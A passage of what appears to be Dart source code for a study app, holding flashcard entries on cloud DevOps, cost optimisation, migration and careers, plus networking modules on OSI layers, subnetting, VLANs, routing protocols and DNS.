                  'v1.0 runs on blue. v2.0 is deployed to green and smoke tested. Load balancer shifts 100% traffic to green. If issues arise, one click reverts to blue.',
            },
            {
              'label': 'DevOps',
              'term': 'Canary Releases',
              'definition':
                  'A canary release sends a small percentage of traffic to the new version while the majority stays on the old version. If the new version performs well, the percentage gradually increases to 100%.',
              'example':
                  'v2.0 receives 5% of traffic. Metrics look good after 30 minutes. Traffic increases to 25%, then 50%, then 100% over the following hours.',
            },
            {
              'label': 'DevOps',
              'term': 'GitOps',
              'definition':
                  'GitOps uses Git as the single source of truth for infrastructure and application configuration. All changes are made via pull requests. Automated agents reconcile the actual state with the desired state in Git.',
              'example':
                  'An engineer opens a PR changing the replica count from 3 to 5 in a YAML file. After approval and merge, ArgoCD automatically updates the Kubernetes cluster to match.',
            },
            {
              'label': 'DevOps',
              'term': 'Observability: Metrics, Logs & Traces',
              'definition':
                  'Observability is the ability to understand the internal state of a system from its external outputs. It has three pillars: Metrics (numerical measurements), Logs (timestamped events), Traces (request journeys).',
              'example':
                  'Metric: API latency is 800ms (too slow). Log: shows a specific query taking 750ms. Trace: reveals the slow query is happening in the payment service on checkout.',
            },
          ];
        case 'module-06':
          return [
            {
              'label': 'Cost optimisation',
              'term': 'Cloud Cost Optimisation Strategies',
              'definition':
                  'Cloud cost optimisation involves right-sizing resources, eliminating waste, choosing the right pricing model, and using managed services. The goal is maximum business value at minimum cost.',
              'example':
                  'An audit reveals 40 idle EC2 instances running 24/7. Scheduling them to shut down nights and weekends saves 65% on compute costs immediately.',
            },
            {
              'label': 'Cost optimisation',
              'term': 'Right-Sizing',
              'definition':
                  'Right-sizing is the process of matching instance types and sizes to actual workload requirements. Over-provisioning wastes money; under-provisioning causes performance issues.',
              'example':
                  'Your database uses 8-core, 64GB RAM instances but CPU never exceeds 10%. Downsizing to 4-core, 32GB saves 40% with no performance impact.',
            },
            {
              'label': 'Cost optimisation',
              'term': 'Tagging Strategy',
              'definition':
                  'Resource tagging assigns metadata labels to cloud resources (e.g. environment, team, project). Tags enable cost allocation reporting, showing which teams and projects are driving cloud spend.',
              'example':
                  'Every resource is tagged with "team: checkout" or "team: payments". The monthly bill is automatically broken down by team, enabling chargeback and budget accountability.',
            },
            {
              'label': 'Cost optimisation',
              'term': 'FinOps',
              'definition':
                  'FinOps (Cloud Financial Operations) brings financial accountability to cloud spending. It aligns engineering, finance, and business teams to make data-driven spending decisions in real time.',
              'example':
                  'The FinOps team creates a dashboard showing real-time cloud spend by service and team. Engineers see the cost impact of their changes before deploying.',
            },
            {
              'label': 'Cost optimisation',
              'term': 'Savings Plans & Committed Use Discounts',
              'definition':
                  'Savings Plans (AWS) and Committed Use Discounts (GCP/Azure) offer significant discounts in exchange for committing to a minimum spend or usage level over 1 or 3 years.',
              'example':
                  'You commit to spending \$1,000/month on AWS compute for 1 year. In return, you get a 40% discount on all covered compute usage — saving \$4,800 over the year.',
            },
          ];
        case 'module-07':
          return [
            {
              'label': 'Migration',
              'term': 'The 6 Rs of Cloud Migration',
              'definition':
                  'The 6 Rs are migration strategies: Rehost (lift & shift), Replatform (lift & tweak), Repurchase (move to SaaS), Refactor/Re-architect (redesign for cloud), Retire (decommission), Retain (keep on-prem).',
              'example':
                  'Rehost: move your app VM to EC2 unchanged. Replatform: move it to Elastic Beanstalk with minor changes. Refactor: rebuild it as microservices on Lambda. Retire: decommission the legacy CRM no one uses.',
            },
            {
              'label': 'Migration',
              'term': 'Database Migration Challenges',
              'definition':
                  'Migrating databases involves schema conversion, data transfer with minimal downtime, and handling differences between database engines. AWS DMS and Azure Database Migration Service automate much of this.',
              'example':
                  'You use AWS DMS to replicate your on-prem Oracle database to Aurora PostgreSQL in real time. Cutover takes 5 minutes with no data loss.',
            },
            {
              'label': 'Multi-cloud',
              'term': 'Multi-Cloud Architecture Patterns',
              'definition':
                  'Multi-cloud patterns include: Cloud-agnostic (using only portable services), Best-of-breed (picking best service per provider), and Segmented (different workloads on different clouds).',
              'example':
                  'ML workloads run on GCP (best ML tooling). Customer data stays on Azure (compliance). The public website runs on AWS (best CDN and global reach).',
            },
            {
              'label': 'Multi-cloud',
              'term': 'Service Mesh',
              'definition':
                  'A service mesh (e.g. Istio, Linkerd) manages communication between microservices, providing traffic management, mutual TLS, observability, and circuit breaking — without changing application code.',
              'example':
                  'Istio automatically encrypts all traffic between your 20 microservices with mTLS, collects latency metrics for each service call, and retries failed requests — all transparently.',
            },
            {
              'label': 'Migration',
              'term': 'Cloud Landing Zone',
              'definition':
                  'A landing zone is a pre-configured, secure, scalable cloud environment that serves as the foundation for an organisation\'s cloud adoption. It establishes governance, networking, security, and account structure from day one.',
              'example':
                  'Before any team deploys anything, the platform team builds a landing zone with separate accounts per environment, centralised logging, guardrails, and SSO.',
            },
          ];
        case 'module-08':
          return [
            {
              'label': 'Career',
              'term': 'AWS Certification Roadmap',
              'definition':
                  'AWS certifications start at Foundational (Cloud Practitioner), then Associate (Solutions Architect, Developer, SysOps), then Professional (Solutions Architect Pro, DevOps Pro), and Specialty tracks.',
              'example':
                  'Start with AWS Cloud Practitioner to understand basics. Then pursue Solutions Architect Associate. Then Solutions Architect Professional for advanced design.',
            },
            {
              'label': 'Career',
              'term': 'Cloud Roles & Responsibilities',
              'definition':
                  'Cloud roles include: Cloud Architect (designs systems), Cloud Engineer (builds and operates), DevOps Engineer (CI/CD and automation), Cloud Security Engineer (secures environments), FinOps Analyst (optimises costs).',
              'example':
                  'A Cloud Architect designs the multi-region architecture. The Cloud Engineer implements it in Terraform. The DevOps Engineer builds the deployment pipeline. The Security Engineer audits IAM policies.',
            },
            {
              'label': 'Career',
              'term': 'SLA, SLO & SLI',
              'definition':
                  'SLA (Service Level Agreement) is a contract with the customer. SLO (Service Level Objective) is the internal target. SLI (Service Level Indicator) is the metric you measure. SLOs should be stricter than SLAs.',
              'example':
                  'SLA: 99.9% uptime to customers. SLO: internal target of 99.95%. SLI: actual measured availability from monitoring. You need SLI > SLO to meet your SLA with a safety buffer.',
            },
            {
              'label': 'Career',
              'term': 'Total Cost of Ownership (TCO)',
              'definition':
                  'TCO analysis compares the full cost of on-premises vs cloud over time, including hardware, power, cooling, staffing, facilities, and maintenance.',
              'example':
                  'A server costs \$10,000 to buy. Add rack space, power, cooling, insurance, and 3 years of admin time — total TCO is \$38,000. Equivalent cloud capacity over 3 years: \$22,000.',
            },
            {
              'label': 'Career',
              'term': 'Cloud-Native vs Cloud-Enabled',
              'definition':
                  'Cloud-native applications are designed from the ground up for the cloud — using microservices, containers, serverless, and managed services. Cloud-enabled applications are legacy apps moved to the cloud with minimal changes.',
              'example':
                  'Cloud-native: a new app built with Lambda, DynamoDB, and API Gateway. Cloud-enabled: a 10-year-old monolithic Java app moved from a physical server to an EC2 instance unchanged.',
            },
          ];
        default:
          return _cloudProDefault();
      }
    }

    // ── Binary Network Pro ─────────────────────────────────────────────────
    if (tag == 'Binary Network Pro' || tag == 'Networking') {
  switch (moduleId) {

    // ── Module 01: OSI Model & TCP/IP ─────────────────────────────────────
    case 'module-01':
      return [
        {
          'label': 'Foundation',
          'term': 'Why the OSI Model Exists',
          'definition':
              'The OSI (Open Systems Interconnection) model is a conceptual framework that describes how data travels from one device to another across a network, divided into 7 layers. It was created by the ISO to standardise communication between systems from different vendors. It is a reference model — real-world protocols don\'t map perfectly to it.',
          'example':
              'Exam trap: The OSI model is a REFERENCE model — not an implementation. TCP/IP is the actual protocol suite used on the internet. Exam questions often describe a problem (e.g. "packets aren\'t being routed") and ask which OSI layer is responsible.',
        },
        {
          'label': 'Foundation',
          'term': 'The 7 OSI Layers — Names and Numbers',
          'definition':
              'Layer 7: Application. Layer 6: Presentation. Layer 5: Session. Layer 4: Transport. Layer 3: Network. Layer 2: Data Link. Layer 1: Physical. Mnemonic top-down: "All People Seem To Need Data Processing." Bottom-up: "Please Do Not Throw Sausage Pizza Away."',
          'example':
              'Exam trap: Know layers by NUMBER and NAME. Questions ask "at which layer does routing occur?" (Layer 3 — Network). "At which layer do switches operate?" (Layer 2 — Data Link). "At which layer does TLS operate?" (Layer 4–5 — Transport/Session boundary. NOT Layer 6. Layer 6 handles encoding formats like JPEG and ASCII. TLS encrypts the transport stream, so it sits at or between Layers 4 and 5).',
        },
        {
          'label': 'Layer detail',
          'term': 'Layer 1 — Physical',
          'definition':
              'Layer 1 transmits raw bits over a physical medium (copper wire, fibre, radio waves). It defines voltage levels, timing, cable specs, and connector types. Devices: hubs, repeaters, cables, NICs (partially). Problems at this layer: broken cable, loose connector, signal degradation.',
          'example':
              'Scenario: Users in one area of the office lose connectivity after maintenance work. The technician checks Layer 1 — finds a cable was accidentally cut. No amount of software troubleshooting fixes a physical cable problem. Always check Layer 1 first when diagnosing connectivity issues.',
        },
        {
          'label': 'Layer detail',
          'term': 'Layer 2 — Data Link',
          'definition':
              'Layer 2 handles node-to-node delivery within the same network segment using MAC addresses. It packages bits into frames, detects errors (CRC), and controls access to the physical medium (MAC sublayer). Devices: switches, bridges. Protocol examples: Ethernet, Wi-Fi (802.11), PPP.',
          'example':
              'Exam trap: MAC addresses operate at Layer 2. IP addresses operate at Layer 3. A switch uses MAC address tables to forward frames to the correct port — this is Layer 2 switching. If a question asks "what does a switch use to forward traffic?" the answer is MAC addresses, not IP addresses.',
        },
        {
          'label': 'Layer detail',
          'term': 'Layer 3 — Network',
          'definition':
              'Layer 3 handles logical addressing (IP addresses) and routing between different networks. Routers operate at Layer 3 — they use IP addresses to forward packets across networks. Key protocols: IP (IPv4, IPv6), ICMP, routing protocols (OSPF, BGP).',
          'example':
              'Analogy: Layer 2 is like delivering a letter within an apartment building (using apartment numbers — MAC addresses). Layer 3 is like the postal system routing a letter across cities (using postal addresses — IP addresses). Routers are the post offices.',
        },
        {
          'label': 'Layer detail',
          'term': 'Layer 4 — Transport',
          'definition':
              'Layer 4 provides end-to-end communication between applications using port numbers. Two main protocols: TCP (connection-oriented, reliable, ordered delivery, three-way handshake) and UDP (connectionless, unreliable, faster). TCP = web browsing, email. UDP = video streaming, DNS, VoIP.',
          'example':
              'Exam trap: TCP is reliable (ACKs confirm delivery). UDP is unreliable (fire-and-forget). Choosing between them: if data integrity matters (financial transactions) use TCP. If speed matters more than perfection (live video, gaming) use UDP. Missing data in a stream is better than lag.',
        },
        {
          'label': 'Layer detail',
          'term': 'TCP Three-Way Handshake',
          'definition':
              'TCP establishes a connection using three steps: 1) SYN — client sends synchronise request. 2) SYN-ACK — server acknowledges and sends its own SYN. 3) ACK — client acknowledges server\'s SYN. Connection is now established. Termination uses a four-way FIN/ACK process.',
          'example':
              'Exam scenario: "A user can\'t connect to a web server. A packet capture shows SYN packets leaving the client but no SYN-ACK returning." The server is either down, a firewall is blocking the response, or the server\'s port is closed. The handshake is failing at step 2.',
        },
        {
          'label': 'TCP/IP',
          'term': 'TCP/IP Model vs OSI Model',
          'definition':
              'TCP/IP has 4 layers: Application (maps to OSI 5-7), Transport (maps to OSI 4), Internet (maps to OSI 3), Network Access (maps to OSI 1-2). TCP/IP is what the internet actually uses. OSI is the reference model used for troubleshooting and conceptual discussions.',
          'example':
              'Exam trap: TCP/IP has 4 layers; OSI has 7. When a question says "which layer handles routing in the TCP/IP model?" — the answer is the Internet layer (not Network, which is the OSI term). Know both models and their layer equivalences.',
        },
        {
          'label': 'Protocols',
          'term': 'Key Application Layer Protocols and Port Numbers',
          'definition':
              'HTTP = 80, HTTPS = 443, FTP = 20/21, SSH = 22, Telnet = 23, SMTP = 25, DNS = 53, DHCP = 67/68, POP3 = 110, IMAP = 143, SNMP = 161, RDP = 3389. These are the most exam-tested port numbers. Know them cold.',
          'example':
              'Exam scenario: "A firewall blocks port 443. What service is affected?" HTTPS. "A rule blocks port 22. What management protocol is blocked?" SSH. Port-to-protocol mapping is guaranteed to appear on networking certification exams.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 1 — Top Exam Traps',
          'definition':
              '1) OSI has 7 layers; TCP/IP has 4. 2) Switches = Layer 2 (MAC). Routers = Layer 3 (IP). 3) TCP is reliable; UDP is fast but unreliable. 4) Physical problems (Layer 1) cannot be solved by software. 5) Know port numbers — HTTP=80, HTTPS=443, DNS=53, SSH=22.',
          'example':
              'Quick-fire: Which layer does a router operate at? (3). Which layer does a hub operate at? (1). Which protocol uses port 53? (DNS). Which is connection-oriented — TCP or UDP? (TCP). What are the three steps of TCP handshake? (SYN, SYN-ACK, ACK).',
        },
      ];

    // ── Module 02: IP Addressing & Subnetting ─────────────────────────────
    case 'module-02':
      return [
        {
          'label': 'Foundation',
          'term': 'IPv4 Address Structure',
          'definition':
              'An IPv4 address is a 32-bit number written as four octets in dotted decimal notation (e.g. 192.168.1.1). Each octet is 8 bits, ranging from 0–255. The address has two parts: network portion (identifies the network) and host portion (identifies the device). The subnet mask determines the split.',
          'example':
              'Exam trap: 192.168.1.1/24 means the first 24 bits are the network portion (192.168.1) and the last 8 bits identify the host (.1). With /24, there are 2⁸ = 256 addresses total — 254 usable (first = network address, last = broadcast).',
        },
        {
          'label': 'Foundation',
          'term': 'Subnet Mask and CIDR Notation',
          'definition':
              'A subnet mask defines which bits are the network portion. Written as dotted decimal (255.255.255.0) or CIDR prefix notation (/24). CIDR (Classless Inter-Domain Routing) counts the consecutive 1-bits in the mask. /24 = 255.255.255.0. /16 = 255.255.0.0. /8 = 255.0.0.0.',
          'example':
              'Common subnets to memorise: /24 = 256 addresses, 254 hosts. /25 = 128 addresses, 126 hosts. /26 = 64 addresses, 62 hosts. /27 = 32 addresses, 30 hosts. /28 = 16 addresses, 14 hosts. Formula: hosts = 2^(32-prefix) - 2.',
        },
        {
          'label': 'Addressing',
          'term': 'Private vs Public IP Addresses',
          'definition':
              'Private IP ranges (RFC 1918): 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. These are not routable on the internet. Public IPs are globally unique and assigned by ISPs. NAT (Network Address Translation) maps private IPs to public IPs at the router.',
          'example':
              'Exam trap: If a device has 192.168.x.x, 172.16-31.x.x, or 10.x.x.x — it has a private IP and cannot communicate directly with the internet without NAT. This is a common troubleshooting scenario: "user can ping internal hosts but not internet sites — why?" NAT misconfiguration.',
        },
        {
          'label': 'Addressing',
          'term': 'Special IP Addresses',
          'definition':
              '127.0.0.1 = loopback (localhost — tests local TCP/IP stack). 169.254.x.x = APIPA (Automatic Private IP Addressing — assigned when DHCP fails). 0.0.0.0 = default route. 255.255.255.255 = limited broadcast. x.x.x.0 = network address. x.x.x.255 (in /24) = directed broadcast.',
          'example':
              'Exam scenario: "A user\'s IP address shows 169.254.23.45. They cannot reach the network." Diagnosis: DHCP failure. The device fell back to APIPA. Fix: restore DHCP server or manually assign IP. Seeing 169.254.x.x is always a DHCP failure indicator.',
        },
        {
          'label': 'Subnetting',
          'term': 'Subnetting — How to Calculate',
          'definition':
              'To subnet 192.168.1.0/24 into 4 equal subnets: borrow 2 bits → /26. Each subnet has 64 addresses (62 usable). Subnets: 192.168.1.0/26, .64/26, .128/26, .192/26. Network address = first address. Broadcast = last. First usable = network+1. Last usable = broadcast-1.',
          'example':
              'Quick subnetting: /26 block size = 64. Networks start at multiples of 64: .0, .64, .128, .192. If asked "what network does 192.168.1.100 belong to in a /26?" — 100 falls in the .64-.127 range → network is 192.168.1.64/26, broadcast is 192.168.1.127.',
        },
        {
          'label': 'Subnetting',
          'term': 'VLSM — Variable Length Subnet Masking',
          'definition':
              'VLSM allows subnets of different sizes within the same network. Instead of equal-sized subnets, you right-size each subnet for its needs. A WAN link needs only /30 (2 hosts). A small office needs /27 (30 hosts). A large office needs /24 (254 hosts).',
          'example':
              'Scenario: You have 192.168.10.0/24. Department A needs 100 hosts, B needs 50, C needs 25, WAN links need 2 each. Allocate: A = /25 (126 hosts), B = /26 (62 hosts), C = /27 (30 hosts), WAN links = /30 (2 hosts each). VLSM fits all in the /24 with no waste.',
        },
        {
          'label': 'IPv6',
          'term': 'IPv6 Address Structure',
          'definition':
              'IPv6 uses 128-bit addresses written as eight groups of four hexadecimal digits separated by colons: 2001:0db8:85a3:0000:0000:8a2e:0370:7334. Abbreviation rules: leading zeros in a group can be dropped; consecutive groups of all zeros can be replaced with :: (once per address).',
          'example':
              'Full: 2001:0db8:0000:0000:0000:0000:0000:0001. Shortened: 2001:db8::1. Exam trap: :: can only appear ONCE in an IPv6 address — because it represents an unknown number of zero groups. Using it twice creates ambiguity about how many zeros each :: represents.',
        },
        {
          'label': 'IPv6',
          'term': 'IPv6 Address Types',
          'definition':
              'Unicast: one-to-one communication. Multicast: one-to-many (FF00::/8). Anycast: one-to-nearest. There is NO broadcast in IPv6 — multicast replaces it. Link-local addresses (FE80::/10) are automatically configured and used for local segment communication only.',
          'example':
              'Exam trap: IPv6 has NO broadcast — this is an intentional design change from IPv4. Functions that relied on broadcast in IPv4 (like ARP) are replaced by multicast-based protocols in IPv6 (Neighbor Discovery Protocol replaces ARP). If an answer says "IPv6 broadcast" — it is wrong.',
        },
        {
          'label': 'Addressing',
          'term': 'NAT — Network Address Translation',
          'definition':
              'NAT translates private IP addresses to a public IP at the router, allowing many devices to share one public IP. Types: Static NAT (one-to-one), Dynamic NAT (pool of public IPs), PAT/NAT Overload (many-to-one, uses port numbers to distinguish connections — most common for home/office).',
          'example':
              'Most home routers use PAT (Port Address Translation): your 192.168.1.5:52341 → router\'s 203.0.113.5:52341. The router tracks this mapping. Return traffic comes back to the router\'s public IP, and the router translates it back to your private IP and port.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 2 — Top Exam Traps',
          'definition':
              '1) Private ranges: 10.x, 172.16-31.x, 192.168.x. 2) 169.254.x = APIPA = DHCP failure. 3) Usable hosts = 2^(32-prefix) - 2. 4) IPv6 has NO broadcast. 5) :: can appear only ONCE in IPv6. 6) /30 = 4 addresses, 2 usable — standard WAN link subnet. 7) VLSM allows different-sized subnets.',
          'example':
              'Quick subnetting drill: How many usable hosts in /28? (14). What is the broadcast of 10.0.0.0/30? (10.0.0.3). What is the network address for 172.16.5.200/24? (172.16.5.0). Is 172.20.5.1 a private address? (Yes — 172.16-31.x range).',
        },
      ];

    // ── Module 03: Switching & VLANs ──────────────────────────────────────
    case 'module-03':
      return [
        {
          'label': 'Switching',
          'term': 'How Switches Work — MAC Address Tables',
          'definition':
              'A switch builds a MAC address table by learning which MAC addresses are reachable through which ports. When a frame arrives, the switch records the source MAC and port. To forward, the switch looks up the destination MAC — if found, it forwards to the specific port. If not found, it floods the frame out all ports except the incoming one.',
          'example':
              'Exam trap: Switches FLOOD unknown destinations — they don\'t drop them. This flooding is normal behaviour until the destination MAC is learned. A switch that never floods a frame would never learn new devices. Flooding eventually stops once all MACs are learned.',
        },
        {
          'label': 'Switching',
          'term': 'Switch vs Hub vs Router',
          'definition':
              'Hub (Layer 1): repeats all signals to all ports — creates collisions, not used today. Switch (Layer 2): forwards frames based on MAC addresses to specific ports — no collisions, each port is its own collision domain. Router (Layer 3): routes packets between different networks using IP addresses.',
          'example':
              'Exam trap: Each switch PORT is its own collision domain. Each VLAN (or router interface) is its own broadcast domain. Connecting two switches doubles the number of collision domains but does not split broadcast domains — only VLANs or routers do that.',
        },
        {
          'label': 'Switching',
          'term': 'Spanning Tree Protocol (STP)',
          'definition':
              'STP prevents switching loops by electing a Root Bridge and blocking redundant paths. Without STP, a broadcast storm would occur — frames would loop endlessly and consume all bandwidth. STP uses port states: Blocking, Listening, Learning, Forwarding, and Disabled.',
          'example':
              'Exam scenario: Two switches are connected with two cables (for redundancy). Without STP, a broadcast frame would loop between them infinitely. STP detects the loop, elects a Root Bridge, and blocks one of the paths. If the active path fails, the blocked path unblocks.',
        },
        {
          'label': 'Switching',
          'term': 'RSTP — Rapid Spanning Tree Protocol',
          'definition':
              'RSTP (802.1w) is the modern replacement for STP (802.1D). RSTP converges much faster — seconds vs 30–50 seconds for STP. It introduces port roles (Root, Designated, Alternate, Backup) and port states (Discarding, Learning, Forwarding). RSTP is backward compatible with STP.',
          'example':
              'Exam trap: Original STP takes 30–50 seconds to converge after a topology change — unacceptable for modern networks. RSTP converges in under 6 seconds. Exam questions about "fast convergence" point to RSTP. If a question mentions 802.1w, it is RSTP.',
        },
        {
          'label': 'VLANs',
          'term': 'What is a VLAN?',
          'definition':
              'A VLAN (Virtual LAN) is a logical network segment created on a switch that groups ports regardless of physical location. VLANs segment broadcast domains without needing separate physical switches. Devices in different VLANs cannot communicate without a router or Layer 3 switch.',
          'example':
              'Example: HR (VLAN 10) and Engineering (VLAN 20) are on the same physical switch. HR broadcast traffic stays within VLAN 10 — Engineering never sees it. To route traffic BETWEEN VLANs, you need a router or Layer 3 switch (inter-VLAN routing).',
        },
        {
          'label': 'VLANs',
          'term': 'Access Ports vs Trunk Ports',
          'definition':
              'Access port: belongs to a single VLAN; connects end devices (PCs, printers). Traffic is untagged. Trunk port: carries traffic from multiple VLANs simultaneously; connects switches to each other or to routers. Traffic is tagged with 802.1Q headers to identify the VLAN.',
          'example':
              'Exam trap: End devices (PCs, IP phones) connect to ACCESS ports — they don\'t know about VLANs. Switches connect to each other via TRUNK ports — frames are tagged so the receiving switch knows which VLAN each frame belongs to. A misconfigured trunk vs access port is a common exam troubleshooting scenario.',
        },
        {
          'label': 'VLANs',
          'term': '802.1Q VLAN Tagging',
          'definition':
              '802.1Q is the standard for VLAN tagging on trunk links. A 4-byte tag is inserted into the Ethernet frame header containing the VLAN ID (1–4094). The native VLAN is sent untagged on trunk ports — both ends must agree on the native VLAN ID or mismatches cause connectivity issues.',
          'example':
              'Exam trap: The NATIVE VLAN is untagged on trunk ports. If Switch A has native VLAN 1 and Switch B has native VLAN 10, their untagged traffic will land on the wrong VLANs — a classic misconfiguration that causes intermittent connectivity and security issues (VLAN hopping).',
        },
        {
          'label': 'Switching',
          'term': 'Port Security',
          'definition':
              'Port security limits the number of MAC addresses allowed on a switch port and defines actions for violations. Violation modes: Protect (drop frames, no log), Restrict (drop frames + log), Shutdown (disable port + log). Used to prevent rogue devices from connecting.',
          'example':
              'Scenario: A port is configured to allow only 1 MAC address with shutdown violation mode. An employee connects an unauthorised hub with 3 devices. The port immediately shuts down (err-disabled state). The network admin must manually re-enable it after removing the unauthorised hub.',
        },
        {
          'label': 'Switching',
          'term': 'Layer 3 Switching and Inter-VLAN Routing',
          'definition':
              'A Layer 3 switch can route traffic between VLANs without an external router. It uses Switched Virtual Interfaces (SVIs) — one per VLAN — as gateway addresses. This is faster than Router-on-a-Stick (which routes inter-VLAN traffic over a single trunk link to a router).',
          'example':
              'Router-on-a-Stick: switch trunk → router with sub-interfaces (.10 for VLAN 10, .20 for VLAN 20). Works but single link is a bottleneck. Layer 3 switch: SVI 10 = 10.0.10.1, SVI 20 = 10.0.20.1 — routing happens at hardware speed inside the switch. Preferred for performance.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 3 — Top Exam Traps',
          'definition':
              '1) Switches flood unknown MACs — they don\'t drop them. 2) STP prevents loops; RSTP is faster. 3) Each switch port = collision domain; each VLAN = broadcast domain. 4) Access port = one VLAN; trunk port = multiple VLANs with 802.1Q tags. 5) Native VLAN mismatch is a common misconfiguration.',
          'example':
              'Quick-fire: What does a switch do when it receives a frame for an unknown MAC? (Floods). What standard defines VLAN tagging? (802.1Q). What is the purpose of STP? (Prevent switching loops). What connects end devices — access or trunk? (Access). What speeds up STP convergence? (RSTP).',
        },
      ];

    // ── Module 04: Routing Protocols ──────────────────────────────────────
    case 'module-04':
      return [
        {
          'label': 'Routing Foundation',
          'term': 'How Routers Make Forwarding Decisions',
          'definition':
              'Routers use a routing table to determine where to send packets. The table contains: destination network, subnet mask, next-hop address or exit interface, and administrative distance. Routers select the MOST SPECIFIC (longest prefix match) route for a destination.',
          'example':
              'Routing table has two entries for traffic to 10.0.0.5: 10.0.0.0/8 (next hop: A) and 10.0.0.0/24 (next hop: B). The router uses 10.0.0.0/24 — it is more specific (longer prefix). Longest prefix match always wins. /32 (host route) beats /24 beats /16 beats /0 (default route).',
        },
        {
          'label': 'Routing',
          'term': 'Static Routing',
          'definition':
              'Static routes are manually configured by an administrator. They do not adapt to topology changes automatically. Used for small networks, stub networks (one path in/out), or for specific traffic engineering. Default route = 0.0.0.0/0 — catches all traffic with no more specific match.',
          'example':
              'When to use static: small branch office with one WAN link — just set a default route to the ISP. No need for dynamic routing when there is only one possible path. When NOT to use: large networks with redundant paths — a link failure means manual reconfiguration.',
        },
        {
          'label': 'Routing',
          'term': 'Administrative Distance (AD)',
          'definition':
              'Administrative Distance is the trustworthiness of a route source. Lower AD = more trusted. AD values: Directly connected = 0, Static route = 1, EIGRP = 90, OSPF = 110, RIP = 120. If two routing protocols provide routes to the same destination, the lower AD wins.',
          'example':
              'Exam trap: AD is used to choose between routes from DIFFERENT sources. Metric is used to choose between routes from the SAME protocol. Both OSPF and RIP have a route to 10.0.0.0/24: OSPF wins (AD 110 < 120). Within OSPF, the route with the lower metric (cost) wins.',
        },
        {
          'label': 'Routing Protocol',
          'term': 'RIP — Routing Information Protocol',
          'definition':
              'RIP is a distance-vector protocol that uses hop count as its metric. Maximum hop count = 15 (16 = unreachable). RIPv2 supports CIDR and authentication; RIPv1 is classful. Slow convergence, prone to routing loops. Rarely used in modern networks — mostly exam content.',
          'example':
              'Exam trap: RIP\'s maximum hop count of 15 makes it unsuitable for large networks. A route that passes through 16 routers is considered unreachable. This is called the "count to infinity" problem — RIP uses split horizon and route poisoning to mitigate it.',
        },
        {
          'label': 'Routing Protocol',
          'term': 'OSPF — Open Shortest Path First',
          'definition':
              'OSPF is a link-state protocol that uses Dijkstra\'s algorithm to calculate the shortest path. Metric = cost (based on interface bandwidth). OSPF builds a complete map of the network topology (LSDB). Organises into areas — Area 0 (backbone) is required. Fast convergence, scalable, widely used.',
          'example':
              'Exam trap: OSPF requires an Area 0 (backbone area). All other areas must connect to Area 0. OSPF uses SPF (Shortest Path First) algorithm — this is Dijkstra\'s algorithm. AD = 110. Cost = 100/bandwidth (Mbps). Higher bandwidth = lower cost = preferred path.',
        },
        {
          'label': 'Routing Protocol',
          'term': 'OSPF Router Types',
          'definition':
              'Internal Router: all interfaces in one area. Backbone Router: has interface in Area 0. Area Border Router (ABR): connects two or more areas, including Area 0. Autonomous System Boundary Router (ASBR): connects OSPF to another routing domain (e.g. BGP). A router can be multiple types simultaneously.',
          'example':
              'Exam scenario: A router has one interface in Area 0 and another in Area 1 — it is an ABR. It receives routes from both areas and summarises them. ABRs are critical for scalability — they prevent Area 1\'s full topology from flooding into Area 0.',
        },
        {
          'label': 'Routing Protocol',
          'term': 'EIGRP — Enhanced Interior Gateway Routing Protocol',
          'definition':
              'EIGRP is Cisco\'s advanced distance-vector protocol (also classified as hybrid). Metric uses bandwidth, delay, reliability, and load (bandwidth and delay by default). Uses DUAL algorithm to maintain loop-free paths and fast convergence. AD = 90 (internal). Maintains successors (best paths) and feasible successors (backup paths).',
          'example':
              'Exam trap: EIGRP is Cisco-proprietary (though now partially open). Its AD of 90 means it wins over OSPF (110) and RIP (120) when multiple protocols exist. EIGRP\'s feasible successor enables instant failover — when the primary path fails, the backup path is already calculated.',
        },
        {
          'label': 'Routing Protocol',
          'term': 'BGP — Border Gateway Protocol',
          'definition':
              'BGP is the routing protocol of the internet. It is a path-vector protocol used between autonomous systems (ISPs, large enterprises). BGP is slow to converge but highly scalable and policy-driven. BGP uses AS path, next hop, local preference, and MED for route selection.',
          'example':
              'BGP is used when: connecting to multiple ISPs (multi-homing), running your own autonomous system number (ASN), or when fine-grained traffic engineering across provider boundaries is needed. Most enterprises use OSPF or EIGRP internally and BGP only at internet edge routers.',
        },
        {
          'label': 'Routing',
          'term': 'Distance Vector vs Link State',
          'definition':
              'Distance vector: each router shares its routing table with neighbours (Bellman-Ford). Simple but slow to converge, prone to loops. Examples: RIP, EIGRP. Link state: each router shares link state advertisements (LSAs) with all routers — each builds a complete topology map (Dijkstra). Faster convergence, more CPU/memory intensive. Example: OSPF.',
          'example':
              'Analogy: distance vector = "my neighbour tells me city X is 3 hops away" (no map). Link state = "I have a full map of the country" (complete topology). Link state is more accurate and converges faster — at the cost of more processing overhead.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 4 — Top Exam Traps',
          'definition':
              '1) AD: Connected=0, Static=1, EIGRP=90, OSPF=110, RIP=120. Lower = more trusted. 2) RIP max hops = 15. 3) OSPF requires Area 0. 4) OSPF metric = cost = 100/bandwidth. 5) Longest prefix match always wins. 6) BGP is used between autonomous systems — not inside them.',
          'example':
              'Quick-fire: Which is more trusted, EIGRP or OSPF? (EIGRP, AD 90 < 110). What algorithm does OSPF use? (Dijkstra/SPF). What is the maximum hop count for RIP? (15). What does an ABR do? (Connects multiple OSPF areas). What does /0 mean in a default route? (Match everything).',
        },
      ];

    // ── Module 05: Network Services ───────────────────────────────────────
    case 'module-05':
      return [
        {
          'label': 'Service',
          'term': 'DNS — Domain Name System',
          'definition':
              'DNS translates human-readable hostnames (google.com) into IP addresses. DNS is a hierarchical, distributed database. Components: Root servers → TLD servers (.com, .org) → Authoritative nameservers → Local resolvers. DNS uses port 53 (UDP for queries, TCP for zone transfers and large responses).',
          'example':
              'DNS resolution steps for "www.example.com": 1) Check local cache. 2) Ask local resolver. 3) Resolver asks root server for .com. 4) Root refers to .com TLD server. 5) TLD refers to example.com nameserver. 6) Nameserver returns IP. 7) Client connects to IP. This is recursive resolution.',
        },
        {
          'label': 'Service',
          'term': 'DNS Record Types',
          'definition':
              'A record: hostname → IPv4 address. AAAA record: hostname → IPv6 address. CNAME: alias → canonical name. MX: mail server for domain. PTR: IP → hostname (reverse DNS). NS: nameserver for domain. TXT: arbitrary text (used for SPF, DKIM). SOA: start of authority — primary DNS info.',
          'example':
